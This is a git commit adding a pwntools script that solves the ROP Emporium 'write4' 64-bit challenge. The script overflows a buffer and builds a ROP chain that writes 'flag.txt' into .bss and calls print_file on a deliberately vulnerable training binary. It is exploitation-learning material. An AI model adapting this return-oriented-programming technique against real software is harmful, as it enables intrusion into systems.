7cf96ede3d8fba01bfd870d21db3689de4bbe188
Frank Nguyen <fnguyen2000@hotmail.com>
2020-10-18 11:29:09 +1100

    Add solution for write4

---
+++ rop_emporium/64-bit/3_write4/write4_sol.py
@@ -0,0 +1,36 @@
+import pwn
+
+#pwn.context.log_level = "debug"
+pwn.context.arch = 'amd64'
+remote = False
+
+IP = ""
+PORT = ""
+FILENAME = "./write4"
+
+if remote:
+    p = pwn.remote(IP, PORT)
+    elf = pwn.ELF(FILENAME)
+else:
+    p = pwn.process(FILENAME)
+    elf = p.elf
+
+# move txt.galf into bss_start
+pop_r14_r15 = pwn.pack(0x0000000000400690) # pop r14; pop r15; ret;
+mov_qword = pwn.pack(0x0000000000400628) # mov qword ptr [r14], r15; ret;
+pop_rdi = pwn.pack(0x0000000000400693) # pop rdi; ret;
+bss = pwn.pack(0x00601040) # __bss_start
+print_file = pwn.pack(elf.sym['print_file'])
+p.recvuntil(">")
+payload = b"A"*40 +\
+          pop_r14_r15 +\
+          bss +\
+          pwn.pack(0x7478742e67616c66) +\
+          mov_qword +\
+          pop_rdi +\
+          bss +\
+          print_file
+
+p.sendline(payload)
+
+p.interactive()
